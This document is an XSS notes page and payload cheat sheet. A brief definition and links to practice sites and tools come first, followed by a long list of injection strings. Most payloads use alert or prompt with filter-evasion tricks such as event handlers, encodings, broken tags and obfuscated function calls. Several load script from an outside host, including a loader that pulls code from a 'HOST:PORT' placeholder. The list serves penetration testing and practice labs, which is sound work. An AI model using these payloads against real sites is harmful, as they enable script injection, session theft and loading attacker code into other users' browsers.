## What is XSS?
* Cross-site scripting is a type of security vulnerability that can be found in some web applications. 
* XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.
* A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

## Timeline

06.08.2024


## Resources

https://portswigger.net/web-security/cross-site-scripting

Cheat sheet - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

XSS Game to Practice XSS - http://www.xssgame.com/

XSS site to Practice XSS - https://xss-quiz.int21h.jp/

XSS site to Practice XSS - https://xss-game.appspot.com/

## Useful Tools 

DOMinator
XSStrike
DalFox


# Payloads

"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<svg onload=alert(1)>
"><svg onload=alert(1)//
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus! 
<x onclick=alert(1)>click this! 
<x oncopy=alert(1)>copy this! 
<x oncontextmenu=alert(1)>right click this! 
<x oncut=alert(1)>copy this! 
<x ondblclick=alert(1)>double click this! 
<x ondrag=alert(1)>drag this! 
<x contenteditable onfocus=alert(1)>focus this! 
<x contenteditable oninput=alert(1)>input here! 
<x contenteditable onkeydown=alert(1)>press any key! 
<x contenteditable onkeypress=alert(1)>press any key! 
<x contenteditable onkeyup=alert(1)>press any key! 
<x onmousedown=alert(1)>click this! 
<x onmousemove=alert(1)>hover this! 
<x onmouseout=alert(1)>hover this! 
<x onmouseover=alert(1)>hover this! 
<x onmouseup=alert(1)>click this! 
<x contenteditable onpaste=alert(1)>paste here!
<script>alert(1)// 
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js> 
<script src=//3334957647/1>
%3Cx onxxx=alert(1) 
<%78 onxxx=1 
<x %6Fnxxx=1 
<x o%6Exxx=1 
<x on%78xx=1 
<x onxxx%3D1
<X onxxx=1 
<x OnXxx=1 
<X OnXxx=1 
<x onxxx=1 onxxx=1
<x/onxxx=1 
<x%09onxxx=1 
<x%0Aonxxx=1 
<x%0Conxxx=1 
<x%0Donxxx=1 
<x%2Fonxxx=1 
<x 1='1'onxxx=1 
<x 1="1"onxxx=1
<x </onxxx=1 
<x 1=">" onxxx=1 
<http://onxxx%3D1/
<x onxxx=alert(1) 1='
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1=' 
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
<script>alert(1)</script> 
<script src=javascript:alert(1)> 
<iframe src=javascript:alert(1)> 
<embed src=javascript:alert(1)> 
<a href=javascript:alert(1)>click 
<math><brute href=javascript:alert(1)>click 
<form action=javascript:alert(1)><input type=submit> 
<isindex action=javascript:alert(1) type=submit value=click> 
<form><button formaction=javascript:alert(1)>click 
<form><input formaction=javascript:alert(1) type=submit value=click> 
<form><input formaction=javascript:alert(1) type=image value=click> 
<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
<isindex formaction=javascript:alert(1) type=submit value=click> 
<object data=javascript:alert(1)> 
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
<svg><script xlink:href=data:,alert(1) /> 
<math><brute xlink:href=javascript:alert(1)>click 
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)> 
<html ontouchend=alert(1)> 
<html ontouchmove=alert(1)> 
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
"><img src=1 onerror=alert(1)>.gif
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
<script src="data:&comma;alert(1)//
"><script src=data:&comma;alert(1)//
<script src="//brutelogic.com.br&sol;1.js&num; 
"><script src=//brutelogic.com.br&sol;1.js&num; 
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<base href=//0>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
alert`1`
alert&lpar;1&rpar;
alert&#x28;1&#x29
alert&#40;1&#41
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
navigator.vibrate(500)
eval(URL.slice(-8))>#alert(1)
eval(location.hash.slice(1)>#alert(1)
innerHTML=location.hash>#<script>alert(1)</script>
<a draggable="true" ondrag="alert(1)">test</a>
<a draggable="true" ondragend="alert(1)">test</a>
<a draggable="true" ondragenter="alert(1)">test</a>
<a draggable="true" ondragleave="alert(1)">test</a>
<a draggable="true" ondragstart="alert(1)">test</a>
<a id=x tabindex=1 onactivate=alert(1)></a>
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
<a id=x tabindex=1 onfocus=alert(1)></a>
<a id=x tabindex=1 onfocusin=alert(1)></a>
<a onbeforecopy="alert(1)" contenteditable>test</a>
<a onbeforecut="alert(1)" contenteditable>test</a>
<a onbeforepaste="alert(1)" contenteditable>test</a>
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
<a onclick="alert(1)">test</a>
<a oncontextmenu="alert(1)">test</a>
<a oncopy="alert(1)" contenteditable>test</a>
<a oncut="alert(1)" contenteditable>test</a>
<a ondblclick="alert(1)">test</a>
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
<a onkeydown="alert(1)" contenteditable>test</a>
<a onkeypress="alert(1)" contenteditable>test</a>
<a onkeyup="alert(1)" contenteditable>test</a>
<a onmousedown="alert(1)">test</a>
<a onmouseenter="alert(1)">test</a>
<a onmouseleave="alert(1)">test</a>
<a onmousemove="alert(1)">test</a>
<a onmouseout="alert(1)">test</a>
<a onmouseover="alert(1)">test</a>
<a onmouseup="alert(1)">test</a>
<a onpaste="alert(1)" contenteditable>test</a>
